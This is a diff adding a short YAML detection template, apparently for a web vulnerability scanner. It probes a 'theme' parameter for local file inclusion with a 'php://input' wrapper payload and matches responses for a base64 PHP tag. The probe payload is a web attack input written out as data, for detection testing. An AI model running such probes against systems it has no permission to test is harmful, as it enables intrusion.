@@ -1,0 +1,20 @@
+id: lfi5-099
+name: 'Wrapper php via theme'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - wrapper
+description: 'Reads file via php wrapper'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      theme:
+        - 'php://input'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
